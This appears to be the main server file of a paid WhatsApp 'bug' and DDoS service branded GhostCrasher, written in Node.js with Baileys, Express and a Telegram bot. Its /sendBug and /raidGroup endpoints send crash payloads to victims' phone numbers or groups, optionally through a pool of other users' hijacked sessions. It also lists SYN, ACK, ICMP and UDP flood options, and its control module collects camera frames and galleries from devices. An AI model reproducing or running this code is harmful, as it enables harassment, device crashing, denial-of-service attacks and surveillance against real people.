const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const { OWNER_ID, TOKEN, PORT, groupBugs, globalBugs, bugs, tqto, listDDoS, news } = require('./config.js');
const { ToolsController, sesionKey } = require("./tools/tgtools.js");
const VPSController = require("./tools/vps.js");
const { swichBug, fcgb, fcGrup, PayXGroup, CrashLockScreenGb, CatalogBug, BlankXFreeze, satz, BanGroupNew, VampireBugIns, BlankGroupEraV1, groupBan, groupBan1, BlankScreenV1, DelayGroupNew } = require('./func.js');
const safeExit = process.exit;
const activeConnections = {};
const biz = {};
const mess = {};
const {
  default: makeWASocket,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessage,
  areJidsSameUser,
  WAMessageStatus,
  AuthenticationState,
  GroupMetadata,
  getContentType,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  getUSyncDevices,
  baileysLib
} = require("@whiskeysockets/baileys");

const express = require("express");
const http = require("http");
const { Server: SocketIOServer } = require("socket.io");
const crypto = require("crypto");
const app = express();
const controlHttpServer = http.createServer(app);
const controlIO = new SocketIOServer(controlHttpServer, {
  cors: { origin: "*" },
  maxHttpBufferSize: 10e6
});
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const CONTROL_DEVICES_FILE = require("path").join(__dirname, "database", "control_devices.json");
let controlDevices = {};
try {
  if (fs.existsSync(CONTROL_DEVICES_FILE)) {
    controlDevices = JSON.parse(fs.readFileSync(CONTROL_DEVICES_FILE, "utf8"));
  }
} catch (_) {
  controlDevices = {};
}
const CONTROL_PAIRINGS_FILE = require("path").join(__dirname, "database", "controlPairings.json");
let controlPairings = {};
try {
  if (fs.existsSync(CONTROL_PAIRINGS_FILE)) {
    controlPairings = JSON.parse(fs.readFileSync(CONTROL_PAIRINGS_FILE, "utf8"));
  }
} catch (_) { controlPairings = {}; }
function saveControlPairings() {
  try {
    fs.mkdirSync(path.dirname(CONTROL_PAIRINGS_FILE), { recursive: true });
    fs.writeFileSync(CONTROL_PAIRINGS_FILE, JSON.stringify(controlPairings, null, 2));
  } catch (e) { console.error("[CONTROL] gagal menyimpan pairing:", e.message); }
}
function saveControlDevices() {
  try {
    fs.mkdirSync(path.dirname(CONTROL_DEVICES_FILE), { recursive: true });
    fs.writeFileSync(CONTROL_DEVICES_FILE, JSON.stringify(controlDevices, null, 2));
  } catch (e) {
    console.error("[CONTROL] gagal menyimpan devices:", e.message);
  }
}
const controlCameraFrames = {};
const controlGalleryData = {};
const controlControllers = new Map();



// Firebase Cloud Messaging (FCM) for developer push notifications.
let firebaseAdmin = null;
try {
  firebaseAdmin = require("firebase-admin");
  let serviceAccount = null;
  if (process.env.FIREBASE_SERVICE_ACCOUNT_JSON) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON);
  } else {
    const serviceAccountPath = require("path").join(__dirname, "firebase-service-account.json");
    if (fs.existsSync(serviceAccountPath)) {
      serviceAccount = JSON.parse(fs.readFileSync(serviceAccountPath, "utf8"));
    }
  }
  if (serviceAccount) {
    firebaseAdmin.initializeApp({ credential: firebaseAdmin.credential.cert(serviceAccount) });
    console.log("[FCM] Firebase Cloud Messaging siap.");
  } else {
    console.log("[FCM] Service account belum dikonfigurasi; /notif tetap disimpan, push FCM dilewati.");
  }
} catch (err) {
  firebaseAdmin = null;
  console.log("[FCM] Init gagal:", err.message);
}
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const chalk = require('chalk');
const os = require('os');
const SESSION_DIR = path.join(__dirname, "./session");
const OUTPUT_FILE = path.join(__dirname, "session.js");
const DATABASE_DIR = path.join(__dirname, 'database');
const DB_PATH = path.join(DATABASE_DIR, "database.json");
let activeKeys = {};
const XNeuron = require('./tools/xneuron.js');
const ACTIVITY_LOG_PATH = path.join(DATABASE_DIR, 'userActivity.json');
const KEY_FILE = path.join(DATABASE_DIR, 'keyList.json');
const PREMIUM_CREATE_FILE = path.join(__dirname, "database", "premiumCreate.json");
const pendingCreate = {};
const pendingTransaksi = {};
const ID_GROUP_KEDUA = "-1003198722679";
const ID_GROUP = [-1003198722679];
const globalCooldown = new Map();
const GLOBAL_COOLDOWN_MINUTES = 15;
const GLOBAL_COOLDOWN_MS = GLOBAL_COOLDOWN_MINUTES * 60 * 1000;

// ============================================================
// 🎨 THEME HELPER — tampilan aesthetic
// ============================================================
const THEME_SEP = '⚘  ────────────────────  ⚘';
const THEME_SEP_LONG = '⚘  ──────────────────────────────  ⚘';

const BOLD_MAP = {
  A: '𝗔', B: '𝗕', C: '𝗖', D: '𝗗', E: '𝗘', F: '𝗙', G: '𝗚', H: '𝗛', I: '𝗜',
  J: '𝗝', K: '𝗞', L: '𝗟', M: '𝗠', N: '𝗡', O: '𝗢', P: '𝗣', Q: '𝗤', R: '𝗥',
  S: '𝗦', T: '𝗧', U: '𝗨', V: '𝗩', W: '𝗪', X: '𝗫', Y: '𝗬', Z: '𝗭',
  a: '𝗮', b: '𝗯', c: '𝗰', d: '𝗱', e: '𝗲', f: '𝗳', g: '𝗴', h: '𝗵', i: '𝗶',
  j: '𝗷', k: '𝗸', l: '𝗹', m: '𝗺', n: '𝗻', o: '𝗼', p: '𝗽', q: '𝗾', r: '𝗿',
  s: '𝘀', t: '𝘁', u: '𝘂', v: '𝘃', w: '𝘄', x: '𝘅', y: '𝘆', z: '𝘇',
  '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
  '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
};

function boldFont(text) {
  return String(text ?? '').split('').map(c => BOLD_MAP[c] || c).join('');
}

function themeTitle(title) {
  return `<b>${boldFont(title)}</b>\n${THEME_SEP}`;
}

function themeEnd() {
  return THEME_SEP;
}

// ===== FUNGSI TRUNCATE CAPTION (FIX ERROR) =====
function truncateCaption(text, maxLength = 1024) {
  if (!text) return text;
  if (text.length <= maxLength) return text;
  return text.slice(0, maxLength - 3) + '...';
}
// ================================================

function isGlobalCooldown(username) {
  const lastUse = globalCooldown.get(username);
  if (!lastUse) return false;

  const now = Date.now();
  const remaining = (lastUse + GLOBAL_COOLDOWN_MS) - now;

  if (remaining <= 0) {
    globalCooldown.delete(username);
    return false;
  }

  return remaining;
}

function ensureLogDirectory() {
  if (!fs.existsSync(DATABASE_DIR)) {
    fs.mkdirSync(DATABASE_DIR, { recursive: true });
  }
}

function cleanOrphanSessions() {
  const sessionRoot = path.join(__dirname, 'session');
  if (!fs.existsSync(sessionRoot)) return;

  const userFolders = fs.readdirSync(sessionRoot).filter(f => {
    return fs.lstatSync(path.join(sessionRoot, f)).isDirectory();
  });

  for (const user of userFolders) {
    const userPath = path.join(sessionRoot, user);
    const items = fs.readdirSync(userPath);

    const folders = items.filter(f => {
      return fs.lstatSync(path.join(userPath, f)).isDirectory();
    });

    const jsonFiles = items.filter(f => f.endsWith('.json'));

    for (const folder of folders) {
      const jsonName = `${folder}.json`;
      if (!jsonFiles.includes(jsonName)) {
        const target = path.join(userPath, folder);
        try {
          fs.rmSync(target, { recursive: true, force: true });
          console.log(`🗑️ [ORPHAN] Hapus folder tanpa .json: ${user}/${folder}`);
        } catch (err) {
          console.log(`❌ Gagal hapus folder ${folder}: ${err.message}`);
        }
      }
    }

    for (const json of jsonFiles) {
      const folderName = json.replace('.json', '');
      if (!folders.includes(folderName)) {
        const target = path.join(userPath, json);
        try {
          fs.unlinkSync(target);
          console.log(`🗑️ [ORPHAN] Hapus .json tanpa folder: ${user}/${json}`);
        } catch (err) {
          console.log(`❌ Gagal hapus ${json}: ${err.message}`);
        }
      }
    }
  }
}

function getActivityLogs() {
  ensureLogDirectory();

  try {
    if (fs.existsSync(ACTIVITY_LOG_PATH)) {
      const data = fs.readFileSync(ACTIVITY_LOG_PATH, 'utf8');
      return JSON.parse(data);
    }
    return [];
  } catch (error) {
    console.error(`Error reading activity log: ${error.message}`);
    return [];
  }
}

function saveActivityLogs(logs) {
  ensureLogDirectory();

  try {
    fs.writeFileSync(ACTIVITY_LOG_PATH, JSON.stringify(logs, null, 2));
    return true;
  } catch (error) {
    console.error(`Error saving activity log: ${error.message}`);
    return false;
  }
}

function addActivityLog(username, activity, details = {}) {
  const logs = getActivityLogs();

  const newLog = {
    id: Date.now().toString(),
    username,
    activity,
    details,
    timestamp: new Date().toISOString()
  };

  logs.unshift(newLog);

  if (logs.length > 1000) {
    logs.splice(1000);
  }

  saveActivityLogs(logs);
  console.log(`[📝 ACTIVITY] ${username}: ${activity}`);

  return newLog;
}

function getUserActivityLogs(username, limit = 50) {
  const logs = getActivityLogs();
  return logs
    .filter(log => log.username === username)
    .slice(0, limit);
}

function cleanOldLogs(daysToKeep = 30) {
  const logs = getActivityLogs();
  const cutoffDate = new Date();
  cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);

  const filteredLogs = logs.filter(log =>
    new Date(log.timestamp) > cutoffDate
  );

  if (filteredLogs.length !== logs.length) {
    saveActivityLogs(filteredLogs);
    console.log(`[🧹 ACTIVITY] Cleaned ${logs.length - filteredLogs.length} old logs`);
  }

  return filteredLogs.length !== logs.length;
}

function setGlobalCooldown(username) {
  globalCooldown.set(username, Date.now());
}

function sendDeleteNotif(user, deleterId) {
    DEVELOPER_IDS.forEach(id => {

        bot.sendMessage(id,
`${themeTitle('GhostCrasher')}
〄  ${boldFont('Username')} : ${user.username}
〄  ${boldFont('Role')} : ${user.role}
〄  ${boldFont('Expired')} : ${user.expired}
〄  ${boldFont('Creator ID')} : ${user.creatorId}
〄  ${boldFont('Dihapus Oleh')} : ${deleterId}
${themeEnd()}`,
        { parse_mode: "Markdown" }
        );

        bot.sendDocument(
            id,
            "./database/database.json",
            { caption: "📦 Backup database terbaru (Delete User)" }
        );

    });
}

const LOG_FILE = path.join(DATABASE_DIR, 'logUser.txt');

if (fs.existsSync(KEY_FILE)) {
  sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
} else {
  sikmanuk = [];
  fs.writeFileSync(KEY_FILE, JSON.stringify(sikmanuk, null, 2));
}

fs.watchFile(KEY_FILE, () => {
  sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
});

function xnValidateKey(key) {
  try {
    const keyList = JSON.parse(fs.readFileSync(KEY_FILE, 'utf8'));
    const found = Array.isArray(keyList)
      ? keyList.find(k => k.sessionKey === key)
      : null;
    if (!found) return { valid: false };
    return { valid: true, username: found.username, keyInfo: found };
  } catch {
    return { valid: false };
  }
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const bot = new TelegramBot(TOKEN, { polling: true });

app.use('/uploads/xneuron', express.static('uploads/xneuron'));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
const rateLimitMap = {};

function alreadyHasSelfAccount(userId) {
    const users = loadDatabase();
    return users.some(u => String(u.creatorId) === String(userId));
}

function getMemoryInfo() {
  const total = os.totalmem();
  const free = os.freemem();

  return {
    totalMB: (total / 1024 / 1024).toFixed(2),
    freeMB: (free / 1024 / 1024).toFixed(2),
    usedMB: ((total - free) / 1024 / 1024).toFixed(2),
  };
}

const activitiesDB = [
  {
    key: "X",
    activities: [
      {
        type: "login",
        title: "Login berhasil",
        description: "User login ke sistem",
        timestamp: Date.now() - 1000 * 60 * 60,
      },
      {
        type: "create",
        title: "Akun dibuat",
        description: "Berhasil membuat akun baru",
        timestamp: Date.now() - 1000 * 60 * 30,
      },
      {
        type: "system",
        title: "Server Update",
        description: "Sistem diperbarui ke versi terbaru",
        timestamp: Date.now() - 1000 * 60 * 10,
      },
    ],
  },
  {
    key: "X",
    activities: [
      {
        type: "login",
        title: "Login berhasil",
        description: "User masuk sistem",
        timestamp: Date.now(),
      },
    ],
  },
];

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    return res.status(429).json({
      valid: false,
      rateLimit: false,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
const multer = require('multer');
app.use('/uploads', express.static('uploads'));
const DATA_FILE = './database/chat_data.json';
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = file.fieldname === 'voice' ? 'uploads/voices' : 'uploads/images';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
    cb(null, uniqueName);
  }
});
const upload = multer({ storage });

const xneuronUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => {
      const dir = 'uploads/xneuron';
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      cb(null, dir);
    },
    filename: (req, file, cb) => {
      cb(null, `${Date.now()}_${file.originalname}`);
    },
  }),
  limits: { fileSize: 20 * 1024 * 1024 },
});

function readMessages() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, 'utf8');
      return JSON.parse(data);
    }
    return { messages: [], messageIdCounter: 1 };
  } catch (error) {
    return { messages: [], messageIdCounter: 1 };
  }
}

function writeMessages(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('Error writing messages:', error);
  }
}

function getNextId() {
  const data = readMessages();
  const nextId = data.messageIdCounter;
  data.messageIdCounter++;
  writeMessages(data);
  return nextId;
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  return expired;
}

const ADMINS_FILE = path.join(__dirname, 'database', 'admins.json');
const DEVELOPER_IDS = [8725811713];
function loadAdmins() {
  try {
    if (!fs.existsSync(ADMINS_FILE)) {
      const defaultData = {
        staff: [],
        moderators: [],
        owners: [],
        admins: [],
        resellers: [],
        premium: []
      };
      fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultData, null, 2));
      return defaultData;
    }
    const data = fs.readFileSync(ADMINS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading admins file:', error);
    return { staff: [], moderators: [], owners: [], admins: [], resellers: [], premium: [] };
  }
}

function saveAdmins(data) {
  try {
    const dir = path.dirname(ADMINS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving admins file:', error);
    return false;
  }
}

function isDeveloper(userId) {
  return DEVELOPER_IDS.includes(Number(userId));
}

function isStaff(userId) {
  const data = loadAdmins();
  return data.staff.includes(Number(userId));
}

function isModerator(userId) {
  const data = loadAdmins();
  return data.moderators.includes(Number(userId));
}

function isOwner(userId) {
  const data = loadAdmins();
  return data.owners.includes(Number(userId));
}

function isAdmin(userId) {
  const data = loadAdmins();
  return data.admins.includes(Number(userId));
}

function isReseller(userId) {
  const data = loadAdmins();
  return data.resellers.includes(Number(userId));
}

function isPremium(userId) {
  const data = loadAdmins();
  return data.premium.includes(Number(userId));
}

function hasAccess(userId) {
  return (
    isDeveloper(userId) ||
    isStaff(userId) ||
    isModerator(userId) ||
    isOwner(userId) ||
    isAdmin(userId) ||
    isReseller(userId) ||
    isPremium(userId)
  );
}

function loadPremiumCreate() {
  if (!fs.existsSync(PREMIUM_CREATE_FILE)) {
    fs.writeFileSync(PREMIUM_CREATE_FILE, "{}");
    return {};
  }
  return JSON.parse(fs.readFileSync(PREMIUM_CREATE_FILE, "utf8"));
}

function savePremiumCreate(data) {
  fs.writeFileSync(PREMIUM_CREATE_FILE, JSON.stringify(data, null, 2));
}

function getUserStatus(userId) {
  if (isDeveloper(userId)) return "Developer";
  if (isStaff(userId)) return "Staff";
  if (isModerator(userId)) return "Moderator";
  if (isOwner(userId)) return "Owner";
  if (isAdmin(userId)) return "Admin";
  if (isReseller(userId)) return "Reseller";
  if (isPremium(userId)) return "Premium";
  return "No Access";
}

const spamCooldown = {};
const cooldowns = {};

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, role, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, role, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

// =====================================================
// 🔥 KONFIGURASI HARGA UPGRADE ROLE
// =====================================================
const ROLE_PRICES = {
  'member_to_reseller': {
    from: 'member',
    to: 'reseller',
    price: 10000,
    priceFormatted: 'Rp 10.000'
  },
  'reseller_to_admin': {
    from: 'reseller',
    to: 'admin',
    price: 10000,
    priceFormatted: 'Rp 10.000'
  },
  'admin_to_owner': {
    from: 'admin',
    to: 'owner',
    price: 15000,
    priceFormatted: 'Rp 15.000'
  },
  'owner_to_moderator': {
    from: 'owner',
    to: 'moderator',
    price: 15000,
    priceFormatted: 'Rp 15.000'
  },
  'moderator_to_staff': {
    from: 'moderator',
    to: 'staff',
    price: 25000,
    priceFormatted: 'Rp 25.000'
  }
};

const QRIS_IMAGE_URL = 'https://files.catbox.moe/8hny1z.jpg';
const UPGRADE_REQUEST_FILE = path.join(DATABASE_DIR, 'upgradeRequests.json');

function loadUpgradeRequests() {
  try {
    if (!fs.existsSync(UPGRADE_REQUEST_FILE)) {
      fs.writeFileSync(UPGRADE_REQUEST_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(UPGRADE_REQUEST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveUpgradeRequests(data) {
  fs.writeFileSync(UPGRADE_REQUEST_FILE, JSON.stringify(data, null, 2));
}

function getNextRequestId() {
  const requests = loadUpgradeRequests();
  if (requests.length === 0) return 1;
  return Math.max(...requests.map(r => r.id)) + 1;
}

// =====================================================
// 🔥 API ENDPOINTS
// =====================================================
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) {
    addActivityLog(username || 'unknown', 'login_failed', {
      reason: 'Invalid credentials',
      androidId: androidId
    });
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    addActivityLog(username, 'login_failed', {
      reason: 'Account expired',
      expiredDate: user.expiredDate
    });
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);
  if (existingSession && existingSession.androidId !== androidId) {
    console.log(`[📱] Device login baru, override session untuk ${username}`);
  }
  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };
  sesionKey[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };
  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  addActivityLog(username, 'login', {
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId: androidId,
    role: user.role || 'member'
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pair_id: typeof user.pair_id === "string" ? user.pair_id.trim() : "",
    listBug: bugs,
    listDDoS,
    news
  });
});

app.get("/getBugList", (req, res) => {
    const { key } = req.query;
    const use = activeKeys[key];
    return res.json({ status: true, username: use, data: bugs });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);

  if (!userKey) {
    return res.json({ valid: false, reason: "session" });
  }
  if (userKey.androidId !== androidId) {
    return res.json({ valid: false, reason: "device" });
  }
  if (!user) {
    return res.json({ valid: false });
  }
  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }
  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });
  sesionKey[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };
  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pair_id: typeof user.pair_id === "string" ? user.pair_id.trim() : "",
    listBug: bugs,
    listDDoS: [
    { ddos_id: "s-gbps", ddos_name: "SYN High GBPS" },
    { ddos_id: "s-pps", ddos_name: "SYN Traffic Flood" },
    { ddos_id: "a-gbps", ddos_name: "ACK High GBPS" },
    { ddos_id: "a-pps", ddos_name: "ACK Traffic Flood" },
    { ddos_id: "icmp", ddos_name: "ICMP Flood" },
    { ddos_id: "udp", ddos_name: "GUDP ( HIGH RISK )" }
  ],
    news: news
  });
});

app.get("/getKey", (req, res) => {
  const { username } = req.query;
  const keyList = loadKeyList();
  const x = keyList.find(e => e.username === username);
  if (x) {
    return res.json({ status: true, key: x.sessionKey });
  } else {
    return res.json({ status: false })
  };
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});

app.get("/checkSender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];

  if (!keyInfo) {
    return res.json({ connected: false });
  }

  res.json({ connected: true });
});

app.get("/checkGlobalCooldown", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Key tidak valid" });
  }

  const remaining = isGlobalCooldown(keyInfo.username);

  if (remaining) {
    const remainingSeconds = Math.ceil(remaining / 1000);
    const remainingMinutes = Math.ceil(remaining / 60000);
    return res.json({
      onCooldown: true,
      remainingMs: remaining,
      remainingSeconds: remainingSeconds,
      remainingMinutes: remainingMinutes,
      message: `Cooldown ${remainingMinutes} menit lagi`
    });
  }

  return res.json({
    onCooldown: false,
    message: "Siap pakai global sender"
  });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug, target, senderMode } = req.query;

  let targetNumber = (target || "").replace(/\D/g, "");
  const targetJid = targetNumber + "@s.whatsapp.net";

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Key tidak valid" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User tidak ditemukan" });

  addActivityLog(user.username, 'send_bug', {
    bug_type: bug,
    target: targetNumber,
    sender_mode: senderMode || 'private',
    role: user.role
  });

  const canUseGlobal = canUseGlobalSender(user.role);

  if (senderMode === 'global' && canUseGlobal && user.role !== 'developer') {
    const remaining = isGlobalCooldown(user.username);
    if (remaining) {
      const remainingSeconds = Math.ceil(remaining / 1000);
      const remainingMinutes = Math.ceil(remaining / 60000);
      return res.json({
        valid: false,
        cooldown: true,
        message: `Global sender cooldown! Tunggu ${remainingMinutes} menit (${remainingSeconds} detik) lagi.`,
        remainingMs: remaining,
        remainingSeconds: remainingSeconds
      });
    }
  }

  if (user.role === 'developer') {
    console.log(`[👑 DEVELOPER MODE] Cooldown bypassed for ${user.username}`);
  }

  let privateSock = null;
  if (senderMode !== 'global') {
    privateSock = checkActiveSessionInFolder(user.username);
    if (!privateSock) {
      return res.json({ valid: true, sended: false, sender: false, message: "Tidak punya sender private" });
    }
  } else {
    privateSock = null;
  }

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role: true,
    globalAccess: canUseGlobal,
    message: "Proses pengiriman dimulai..."
  });

  setImmediate(async () => {
    console.log(`\n[🚀 START] User: ${user.username} (${user.role}) | Target: ${targetNumber} | Bug: ${bug} | Mode: ${senderMode || 'private'}`);

    let usedSocket = privateSock;
    let usedSenderId = privateSock?.user?.id?.split('@')[0] || 'unknown';

    if (senderMode === 'global' && canUseGlobal) {
      const allSenders = getAllActiveSenders();

      if (allSenders.length > 0) {
        const randomIndex = Math.floor(Math.random() * allSenders.length);
        const selectedSender = allSenders[randomIndex];

        usedSocket = selectedSender.socket;
        usedSenderId = selectedSender.senderId;

        if (user.role !== 'developer') {
          setGlobalCooldown(user.username);
        }

        console.log(`[🌐 GLOBAL MODE] Selected sender: ${usedSenderId} dari ${allSenders.length} aktif`);
      } else {
        console.log(`[⚠️ GLOBAL MODE] No pool senders, GAGAL kirim ke ${targetNumber}`);
        return;
      }
    }

    if (!usedSocket) {
      console.log(`[❌ ERROR] Tidak ada socket tersedia untuk mengirim ke ${targetNumber}`);
      return;
    }

    try {
      await swichBug(usedSocket, targetJid, bug);
      console.log(`[✅ SUCCESS] Bug terkirim ke ${targetNumber} via ${usedSenderId}`);
    } catch (err) {
      console.log(`[⚠️ WARNING] Gagal kirim: ${err.message}`);
    }
  });
});

app.get("/raidGroup", async (req, res) => {
  const { key, bug, link } = req.query;

  if (!link || !link.includes("chat.whatsapp.com")) {
    return res.json({
      valid: true,
      sended: false,
      message: "Link group tidak valid"
    });
  }

  console.log(`\n[📥 NEW REQUEST] RAID GROUP`);
  console.log(`[👤] User Key: ${key}`);
  console.log(`[🔗] Group Link: ${link}`);
  console.log(`[🧪] Bug Type: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Key invalid" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  addActivityLog(user.username, 'raid_group', {
    bug_type: bug,
    link: link,
